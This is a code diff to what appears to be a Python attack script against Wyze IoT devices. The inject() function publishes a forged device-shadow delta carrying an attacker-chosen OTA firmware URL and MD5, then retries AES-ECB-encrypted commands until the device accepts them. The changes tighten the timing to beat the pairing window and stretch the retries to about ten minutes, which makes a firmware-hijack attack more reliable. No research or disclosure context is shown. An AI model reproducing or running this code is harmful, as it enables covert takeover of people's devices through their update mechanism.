@@ -216,7 +216,7 @@ def _live():
     return c
 
 def inject(cli, up=None):
-    time.sleep(8)
+    time.sleep(2)   # the pair can close within seconds; do not outwait the session
     if not MD5:
         print("inject: OTA_MD5 unset",flush=True); return
     st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
@@ -226,13 +226,13 @@ def inject(cli, up=None):
         try:
             with WLOCK:
                 _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
-            print("inject: delta",flush=True); break
+            print("inject: delta",_t.strftime("%H:%M:%S"),flush=True); break
         except Exception as e:
             LIVE["c"]=None
             print("inject delta retry",repr(e),flush=True); time.sleep(2)
     else:
         print("inject: delta gave up",flush=True); return
-    time.sleep(10)
+    time.sleep(3)
     models=[m for m in os.environ.get("OTA_MODELS","").split(",") if m] or [MODEL]
     for i in range(20):
         m=models[i % len(models)]
@@ -281,7 +281,7 @@ def inject(cli, up=None):
                 pl=pl+b"\0"*(-len(pl)%16)
                 e=Cipher(algorithms.AES(k),modes.ECB()).encryptor()
                 pl=e.update(pl)+e.finalize()
-        for _try in range(30):
+        for _try in range(300):  # the device reconnects on its own schedule; wait it out (10 min)
             c=_live()
             if c is None:
                 time.sleep(1); continue
@@ -299,7 +299,7 @@ def inject(cli, up=None):
                 LIVE["c"]=None
                 print("inject cmd retry",repr(e),flush=True); time.sleep(2)
         else:
-            print("inject cmd gave up",flush=True); return
+            print("inject cmd gave up",_t.strftime("%H:%M:%S"),flush=True); return
         time.sleep(4)
 
 LIVE={"c":None}
